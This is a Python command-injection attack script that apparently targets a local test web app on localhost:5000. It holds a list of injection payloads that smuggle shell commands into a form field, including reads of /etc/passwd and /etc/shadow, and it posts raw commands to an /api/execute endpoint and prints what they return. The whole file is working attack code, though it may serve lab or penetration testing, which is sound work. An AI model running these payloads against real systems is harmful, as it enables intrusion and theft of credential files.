#!/usr/bin/env python3
"""
Command Injection Attack Script
Tests various endpoints with command injection payloads
"""

import requests
import time
import sys

BASE_URL = "http://localhost:5000"

def command_injection_attack():
    """Perform command injection attacks on various endpoints"""
    print("\n" + "="*60)
    print("COMMAND INJECTION ATTACK")
    print("="*60)
    
    # Command injection payloads
    payloads = [
        "; ls",
        "; ls -la",
        "; cat /etc/passwd",
        "; whoami",
        "; id",
        "| ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/shadow",
        "; uname -a",
        "; ps aux",
        "; netstat -an",
        "&& ls",
        "|| ls",
        "; echo 'command_injection_test'",
    ]
    
    print("\n[*] Testing /add endpoint with command injection in name field...")
    for payload in payloads[:5]:  # Test first 5 on add endpoint
        print(f"\n[*] Testing payload: {payload}")
        try:
            response = requests.post(
                f"{BASE_URL}/add",
                data={
                    'name': f'TestItem{payload}',
                    'description': 'Test description',
                    'price': '10.00'
                },
                allow_redirects=False,
                timeout=5
            )
            print(f"[+] Status Code: {response.status_code}")
            time.sleep(0.5)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
    
    print("\n[*] Testing /api/execute endpoint with command injection...")
    commands = [
        "ls",
        "ls -la /",
        "cat /etc/passwd",
        "whoami",
        "id",
        "uname -a",
        "ps aux",
        "echo 'command_injection_success'",
    ]
    
    for cmd in commands:
        print(f"\n[*] Executing command: {cmd}")
        try:
            response = requests.post(
                f"{BASE_URL}/api/execute",
                json={'command': cmd},
                timeout=5
            )
            print(f"[+] Status Code: {response.status_code}")
            if response.status_code == 200:
                data = response.json()
                if 'stdout' in data:
                    print(f"[+] Command output: {data['stdout'][:200]}")
                if 'stderr' in data and data['stderr']:
                    print(f"[!] Error output: {data['stderr'][:200]}")
            time.sleep(0.5)
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
    
    print("\n[+] Command injection attack completed")
    return True

if __name__ == "__main__":
    print("Starting Command Injection Attack...")
    print("Make sure the webapp is running on http://localhost:5000")
    time.sleep(2)
    
    success = command_injection_attack()
    sys.exit(0 if success else 1)

